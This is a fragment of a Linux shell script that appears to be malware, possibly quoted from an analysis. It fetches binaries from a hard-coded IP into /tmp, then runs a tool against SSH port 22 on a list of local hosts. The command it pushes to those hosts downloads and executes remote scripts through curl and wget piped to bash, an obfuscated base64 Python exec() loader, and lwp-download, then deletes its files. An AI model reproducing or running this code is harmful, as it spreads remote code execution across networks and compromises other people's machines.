...
python -c "import urllib;print urllib.urlopen(\"http://205.185.116.78/hxx\").read()" > /tmp/hxx
python -c "import urllib;print urllib.urlopen(\"http://205.185.116.78/p\").read()" > /tmp/p
localgo() {
	echo "localgo start"
	...
	echo $hostlist > /tmp/localips
	nohup /tmp/hxx 300 -f /tmp/localips /tmp/p 22 'curl -s http://205.185.116.78/xms | bash -sh; wget -q -O - http://205.185.116.78/xms | bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -; lwp-download http://205.185.116.78/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms' >/dev/null 2>&1
	pkill -9 hxx
	echo "local done"
}
